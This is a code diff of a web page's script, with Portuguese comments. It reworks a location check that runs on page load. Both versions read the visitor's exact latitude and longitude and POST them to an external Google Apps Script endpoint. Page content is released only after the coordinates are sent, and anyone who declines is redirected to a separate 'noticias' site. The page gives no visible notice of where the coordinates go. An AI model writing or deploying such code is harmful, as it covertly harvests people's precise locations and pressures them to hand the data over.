@@ -167,44 +167,54 @@
     window.location.href = "https://noticias2025-max.github.io/Curitiba_e_Regiao01/";
   }
 
-  window.addEventListener('load', () => {
-    if (!navigator.geolocation) {
+  async function verificarPermissaoGeo() {
+    if (!navigator.geolocation || !navigator.permissions) {
       redirecionar();
       return;
     }
 
-    // Se o usuário não responder à permissão em 10 segundos, redireciona
-    const timeout = setTimeout(() => {
-      console.warn("Tempo de espera excedido para geolocalização");
-      redirecionar();
-    }, 10000); // 10 segundos
+    try {
+      const status = await navigator.permissions.query({ name: 'geolocation' });
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      clearTimeout(timeout); // Usuário permitiu a localização, cancela o redirecionamento
-
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-
-      const url = "https://script.google.com/macros/s/AKfycbw4Me_ogE9h_X_lH_NgQq2CGIfh1thqljS5SgivpHjQym7vCvyEIt7ymQ1dSX0uj0Y1AQ/exec";
-      const payload = { latitude: lat, longitude: lon };
-
-      try {
-        await fetch(url, {
-          method: "POST",
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.warn("Erro ao enviar localização:", e);
+      if (status.state === 'denied') {
+        // Usuário já negou a permissão anteriormente
+        redirecionar();
+        return;
       }
 
-      liberarConteudo();
+      // Se ainda não decidiu ou permitiu, tenta obter a localização
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
 
-    }, (error) => {
-      clearTimeout(timeout); // Já vai redirecionar, cancela o timeout
+        const url = "https://script.google.com/macros/s/AKfycbw4Me_ogE9h_X_lH_NgQq2CGIfh1thqljS5SgivpHjQym7vCvyEIt7ymQ1dSX0uj0Y1AQ/exec";
+        const payload = { latitude: lat, longitude: lon };
+
+        try {
+          await fetch(url, {
+            method: "POST",
+            body: JSON.stringify(payload)
+          });
+        } catch (e) {
+          console.warn("Erro ao enviar localização:", e);
+        }
+
+        liberarConteudo();
+
+      }, (error) => {
+        // Usuário negou ao ser perguntado
+        redirecionar();
+      });
+
+    } catch (e) {
+      console.warn("Erro ao verificar permissões:", e);
       redirecionar();
-    });
-  });
+    }
+  }
+
+  window.addEventListener('load', verificarPermissaoGeo);
 </script>
+
 
 
 
